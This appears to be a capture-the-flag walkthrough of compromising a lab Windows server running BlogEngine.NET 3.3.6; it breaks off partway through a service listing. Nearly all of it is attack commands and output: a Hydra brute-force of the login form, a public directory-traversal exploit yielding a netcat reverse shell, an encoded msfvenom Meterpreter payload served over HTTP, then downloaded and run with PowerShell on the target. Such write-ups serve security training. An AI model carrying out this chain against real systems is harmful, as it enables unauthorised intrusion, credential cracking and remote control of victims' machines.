
# Task 1: Deploy the Vulnerable Windows Machine

```Bash
root@ip-10-10-5-223:~# firefox 10.10.106.10
```

![]()

![]()

```Bash
root@ip-10-10-5-223:~# firefox google.com
```

![]()

![]()

# Task 2

`hydra -l <username> -P <password_list> <target_url> http-post-form "<login_url>:<login_parameters>:<failure_response_string>:<success_response_string>"`
```Bash
root@ip-10-10-5-223:~# hydra -l admin -P ~/Tools/wordlists/rockyou.txt 10.10.106.10 http-post-form "/Account/login.aspx:__VIEWSTATE=yLUYZr6CBrGxxYps%2FMn7VaCsMslcoS3X%2Bz6%2F1pAK9lRgOX%2FBfORQPAmFjyE4eUckin8EGGiiY6YVDoT8w7Hy%2FS%2BPn87m66BFnf1OzD5o05DkWqyV354GiQQPF85Rf9kq1zRPZcKLVDxfLiW9xCmriJ4EuwG50NkOIDfxRqI1R%2BYRecZT256qtxei89fqVlJd%2Bhsp3sciE%2FgRjHZ8OMjnQ8Bi0egED4nXIsFbXpvMy6TrvW5uNMJNC%2FQ4gzw0%2FGApwdBjcxzshKxyTB9bLzKuveQ1uDvkZle5k9XOBD%2F4y701pDaAgXwZm7VH08MgJps5YJpMroo%2FWWS1ijUjEDC6JyNAqGPoUMNWpLAH9MOaLNxIcwmX&__EVENTVALIDATION=DhupGzLZHWJCN4ZTyAbeMwMCMi9Jy9DVsTwa%2B18oiWV6KsQ134Z6ucYzUeM%2FWFakQC8hYf%2FRLeMeYYFr3qz0VrHFw9wQhYoWayPhPQeG00YXG5TS6vN0U9qe%2FBUGWovF1zdSC0vK5E9PdNhzAjnX7DoAw5QKHgQr3fCr92dhspYcLdoX&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2023-07-27 16:03:55
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-post-form://10.10.106.10:80//Account/login.aspx:__VIEWSTATE=yLUYZr6CBrGxxYps%2FMn7VaCsMslcoS3X%2Bz6%2F1pAK9lRgOX%2FBfORQPAmFjyE4eUckin8EGGiiY6YVDoT8w7Hy%2FS%2BPn87m66BFnf1OzD5o05DkWqyV354GiQQPF85Rf9kq1zRPZcKLVDxfLiW9xCmriJ4EuwG50NkOIDfxRqI1R%2BYRecZT256qtxei89fqVlJd%2Bhsp3sciE%2FgRjHZ8OMjnQ8Bi0egED4nXIsFbXpvMy6TrvW5uNMJNC%2FQ4gzw0%2FGApwdBjcxzshKxyTB9bLzKuveQ1uDvkZle5k9XOBD%2F4y701pDaAgXwZm7VH08MgJps5YJpMroo%2FWWS1ijUjEDC6JyNAqGPoUMNWpLAH9MOaLNxIcwmX&__EVENTVALIDATION=DhupGzLZHWJCN4ZTyAbeMwMCMi9Jy9DVsTwa%2B18oiWV6KsQ134Z6ucYzUeM%2FWFakQC8hYf%2FRLeMeYYFr3qz0VrHFw9wQhYoWayPhPQeG00YXG5TS6vN0U9qe%2FBUGWovF1zdSC0vK5E9PdNhzAjnX7DoAw5QKHgQr3fCr92dhspYcLdoX&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed
[STATUS] 736.00 tries/min, 736 tries in 00:01h, 14343662 to do in 324:49h, 16 active
[80][http-post-form] host: 10.10.106.10   login: admin   password: 1qaz2wsx
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2023-07-27 16:06:03
```

# Task 3

![]()

![]()

![]()

```Bash
root@ip-10-10-5-223:~# searchsploit --www BlogEngine.net 3.3.6 
[i] Found (#2): /opt/searchsploit/files_exploits.csv
[i] To remove this message, please edit "/opt/searchsploit/.searchsploit_rc" for "files_exploits.csv" (package_array: exploitdb)

[i] Found (#2): /opt/searchsploit/files_shellcodes.csv
[i] To remove this message, please edit "/opt/searchsploit/.searchsploit_rc" for "files_shellcodes.csv" (package_array: exploitdb)

---------------------------------------------------------------------------------------------------------------------------- --------------------------------------------
 Exploit Title                                                                                                              |  URL
---------------------------------------------------------------------------------------------------------------------------- --------------------------------------------
BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution                                                          | https://www.exploit-db.com/exploits/46353
BlogEngine.NET 3.3.6/3.3.7 - 'dirPath' Directory Traversal / Remote Code Execution                                          | https://www.exploit-db.com/exploits/47010
BlogEngine.NET 3.3.6/3.3.7 - 'path' Directory Traversal                                                                     | https://www.exploit-db.com/exploits/47035
BlogEngine.NET 3.3.6/3.3.7 - 'theme Cookie' Directory Traversal / Remote Code Execution                                     | https://www.exploit-db.com/exploits/47011
BlogEngine.NET 3.3.6/3.3.7 - XML External Entity Injection                                                                  | https://www.exploit-db.com/exploits/47014
---------------------------------------------------------------------------------------------------------------------------- --------------------------------------------
Shellcodes: No Results
```

```Bash
root@ip-10-10-5-223:~# firefox https://www.exploit-db.com/exploits/46353
```

![]()

```Bash
root@ip-10-10-5-223:~# find / -type f -name 46353.cs 2>/dev/null
/root/46353.cs
/opt/searchsploit/exploits/aspx/webapps/46353.cs
```

```Bash
root@ip-10-10-5-223:~# mousepad /root/46353.cs 
```

![]()

```Bash
root@ip-10-10-5-223:~# mv 46353.cs PostView.ascx
```

```Bash
root@ip-10-10-5-223:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
```

```Bash
root@ip-10-10-5-223:~# firefox http://10.10.106.10/?theme=../../App_Data/files
```

![]()

```Bash
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 10.10.106.10 49283 received!
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
```

```PowerShell
whoami
c:\windows\system32\inetsrv>whoami
iis apppool\blog
```

# Task 4

```Bash
root@ip-10-10-5-223:~# msfconsole
                                                  
               .;lxO0KXXXK0Oxl:.
           ,o0WMMMMMMMMMMMMMMMMMMKd,
        'xNMMMMMMMMMMMMMMMMMMMMMMMMMWx,
      :KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK:
    .KMMMMMMMMMMMMMMMWNNNWMMMMMMMMMMMMMMMX,
   lWMMMMMMMMMMMXd:..     ..;dKMMMMMMMMMMMMo
  xMMMMMMMMMMWd.               .oNMMMMMMMMMMk
 oMMMMMMMMMMx.                    dMMMMMMMMMMx
.WMMMMMMMMM:                       :MMMMMMMMMM,
xMMMMMMMMMo                         lMMMMMMMMMO
NMMMMMMMMW                    ,cccccoMMMMMMMMMWlccccc;
MMMMMMMMMX                     ;KMMMMMMMMMMMMMMMMMMX:
NMMMMMMMMW.                      ;KMMMMMMMMMMMMMMX:
xMMMMMMMMMd                        ,0MMMMMMMMMMK;
.WMMMMMMMMMc                         'OMMMMMM0,
 lMMMMMMMMMMk.                         .kMMO'
  dMMMMMMMMMMWd'                         ..
   cWMMMMMMMMMMMNxc'.                ##########
    .0MMMMMMMMMMMMMMMMWc            #+#    #+#
      ;0MMMMMMMMMMMMMMMo.          +:+
        .dNMMMMMMMMMMMMo          +#++:++#+
           'oOWMMMMMMMMo                +:+
               .,cdkO0K;        :+:    :+:                                
                                :::::::+:
                      Metasploit

       =[ metasploit v6.3.27-dev-                         ]
+ -- --=[ 2335 exploits - 1220 auxiliary - 413 post       ]
+ -- --=[ 1383 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Search can apply complex filters such as 
search cve:2009 type:exploit, see all the filters 
with help search
Metasploit Documentation: https://docs.metasploit.com/
```

```Bash
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
```

```Bash
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
```

```Bash
msf6 exploit(multi/handler) > set LHOST 10.10.5.223
LHOST => 10.10.5.223
```

```Bash
msf6 exploit(multi/handler) > set LPORT 9998
LPORT => 9998
```

```Bash
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.5.223:9998 
```

```Bash
root@ip-10-10-5-223:~# export LHOST=10.10.5.223
```

```Bash
root@ip-10-10-5-223:~# export LPORT=9998
```

```Bash
root@ip-10-10-5-223:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -e x86/shikata_ga_nai -f exe -o reverse.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of exe file: 73802 bytes
Saved as: reverse.exe
```

```Bash
root@ip-10-10-5-223:~# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```PowerShell
icacls .
c:\windows\system32\inetsrv>icacls .
. NT SERVICE\TrustedInstaller:(F)
  NT SERVICE\TrustedInstaller:(CI)(IO)(F)
  NT AUTHORITY\SYSTEM:(M)
  NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
  BUILTIN\Administrators:(M)
  BUILTIN\Administrators:(OI)(CI)(IO)(F)
  BUILTIN\Users:(RX)
  BUILTIN\Users:(OI)(CI)(IO)(GR,GE)
  CREATOR OWNER:(OI)(CI)(IO)(F)
  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(RX)
  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)
Successfully processed 1 files; Failed processing 0 files
```

```PowerShell
PowerShell.exe -c wget "http://10.10.5.223:8000/reverse.exe" -outfile "reverse.exe"
C:\Windows\Temp>PowerShell.exe -c wget "http://10.10.5.223:8000/reverse.exe" -outfile "reverse.exe"
```

```PowerShell
reverse.exe
C:\Windows\Temp>reverse.exe
```

```Bash
[*] Started reverse TCP handler on 10.10.5.223:9998 
[*] Sending stage (175686 bytes) to 10.10.106.10
[*] Meterpreter session 1 opened (10.10.5.223:9998 -> 10.10.106.10:49321) at 2023-07-27 17:08:25 +0100

meterpreter > 
```

```Bash
meterpreter > sysinfo
Computer        : HACKPARK
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
```

```Bash
```

```PowerShell
SERVICE_NAME: AppHostSvc
DISPLAY_NAME: Application Host Helper Service
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: AWSLiteAgent
DISPLAY_NAME: AWS Lite Guest Agent
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: BFE
DISPLAY_NAME: Base Filtering Engine
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: BrokerInfrastructure
DISPLAY_NAME: Background Tasks Infrastructure Service
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: CertPropSvc
DISPLAY_NAME: Certificate Propagation
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: CryptSvc
DISPLAY_NAME: Cryptographic Services
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: DcomLaunch
DISPLAY_NAME: DCOM Server Process Launcher
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: Dhcp
DISPLAY_NAME: DHCP Client
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: Dnscache
DISPLAY_NAME: DNS Client
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: DPS
DISPLAY_NAME: Diagnostic Policy Service
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: DsmSvc
DISPLAY_NAME: Device Setup Manager
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: Ec2Config
DISPLAY_NAME: Ec2Config
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: EventLog
DISPLAY_NAME: Windows Event Log
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: EventSystem
DISPLAY_NAME: COM+ Event System
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: FontCache
DISPLAY_NAME: Windows Font Cache Service
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: gpsvc
DISPLAY_NAME: Group Policy Client
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_PRESHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: iphlpsvc
DISPLAY_NAME: IP Helper
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: LanmanServer
DISPLAY_NAME: Server
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: LanmanWorkstation
DISPLAY_NAME: Workstation
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: lmhosts
DISPLAY_NAME: TCP/IP NetBIOS Helper
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: LSM
DISPLAY_NAME: Local Session Manager
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: MpsSvc
DISPLAY_NAME: Windows Firewall
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: MSDTC
DISPLAY_NAME: Distributed Transaction Coordinator
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: netprofm
DISPLAY_NAME: Network List Service
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: NlaSvc
DISPLAY_NAME: Network Location Awareness
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: nsi
DISPLAY_NAME: Network Store Interface Service
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: PlugPlay
DISPLAY_NAME: Plug and Play
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: Power
DISPLAY_NAME: Power
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: ProfSvc
DISPLAY_NAME: User Profile Service
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: RpcEptMapper
DISPLAY_NAME: RPC Endpoint Mapper
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: RpcSs
DISPLAY_NAME: Remote Procedure Call (RPC)
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: SamSs
DISPLAY_NAME: Security Accounts Manager
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: Schedule
DISPLAY_NAME: Task Scheduler
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: SENS
DISPLAY_NAME: System Event Notification Service
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: SessionEnv
DISPLAY_NAME: Remote Desktop Configuration
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: ShellHWDetection
DISPLAY_NAME: Shell Hardware Detection
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: Spooler
DISPLAY_NAME: Print Spooler
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: SystemEventsBroker
DISPLAY_NAME: System Events Broker
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: TermService
DISPLAY_NAME: Remote Desktop Services
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: Themes
DISPLAY_NAME: Themes
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: TrkWks
DISPLAY_NAME: Distributed Link Tracking Client
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: UALSVC
DISPLAY_NAME: User Access Logging Service
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_PRESHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: UmRdpService
DISPLAY_NAME: Remote Desktop Services UserMode Port Redirector
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: W32Time
DISPLAY_NAME: Windows Time
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: W3SVC
DISPLAY_NAME: World Wide Web Publishing Service
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: WAS
DISPLAY_NAME: Windows Process Activation Service
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: Wcmsvc
DISPLAY_NAME: Windows Connection Manager
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: WindowsScheduler
DISPLAY_NAME: System Scheduler Service
        TYPE               : 10  WIN32_OWN_PROCESS  
